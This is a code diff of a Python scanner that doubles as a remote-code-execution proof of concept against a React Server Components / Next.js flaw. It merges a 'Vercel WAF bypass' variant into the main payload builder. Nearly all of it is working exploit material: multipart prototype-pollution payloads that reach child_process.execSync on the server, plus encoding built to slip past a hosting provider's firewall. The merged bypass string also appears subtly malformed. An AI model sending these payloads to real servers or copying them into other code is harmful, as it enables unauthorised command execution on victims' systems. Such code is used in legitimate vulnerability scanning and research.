@@ -114,39 +114,7 @@ def build_safe_payload() -> tuple[str, str]:
     return body, content_type
 
 
-def build_vercel_waf_bypass_payload() -> tuple[str, str]:
-    """Build the Vercel WAF bypass multipart form data payload."""
-    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
-
-    part0 = (
-        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
-        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
-        '"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((41*271))\').toString().trim();;'
-        'throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
-        '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
-    )
-
-    body = (
-        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
-        f'Content-Disposition: form-data; name="0"\r\n\r\n'
-        f"{part0}\r\n"
-        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
-        f'Content-Disposition: form-data; name="1"\r\n\r\n'
-        f'"$@0"\r\n'
-        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
-        f'Content-Disposition: form-data; name="2"\r\n\r\n'
-        f"[]\r\n"
-        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
-        f'Content-Disposition: form-data; name="3"\r\n\r\n'
-        f'{{"\\"\u0024\u0024":{{}}}}\r\n'
-        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
-    )
-
-    content_type = f"multipart/form-data; boundary={boundary}"
-    return body, content_type
-
-
-def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> tuple[str, str]:
+def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, vercel_waf_bypass: bool = False) -> tuple[str, str]:
     """Build the RCE PoC multipart form data payload."""
     boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
 
@@ -163,11 +131,16 @@ def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypas
         f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
     )
 
+    if vercel_waf_bypass:
+        formdata_payload = '"get":"$3:\"$$:constructor:constructor"}'
+    else:
+        formdata_payload = '{"get":"$1:constructor:constructor"}'
+
     part0 = (
         '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
         '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
         + prefix_payload
-        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
+        + '","_chunks":"$Q2","_formData":' + formdata_payload + '}}'
     )
 
     parts = []
@@ -196,6 +169,14 @@ def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypas
         f'Content-Disposition: form-data; name="2"\r\n\r\n'
         f"[]\r\n"
     )
+
+    if vercel_waf_bypass:
+        parts.append(
+            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+            f'Content-Disposition: form-data; name="3"\r\n\r\n'
+            f'{{"\\"\u0024\u0024":{{}}}}\r\n'
+        )
+
     parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")
 
     body = "".join(parts)
@@ -330,11 +311,8 @@ def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, f
     if safe_check:
         body, content_type = build_safe_payload()
         is_vulnerable = is_vulnerable_safe_check
-    elif vercel_waf_bypass:
-        body, content_type = build_vercel_waf_bypass_payload()
-        is_vulnerable = is_vulnerable_rce_check
     else:
-        body, content_type = build_rce_payload(windows=windows, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb)
+        body, content_type = build_rce_payload(windows=windows, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, vercel_waf_bypass=vercel_waf_bypass)
         is_vulnerable = is_vulnerable_rce_check
 
     headers = {
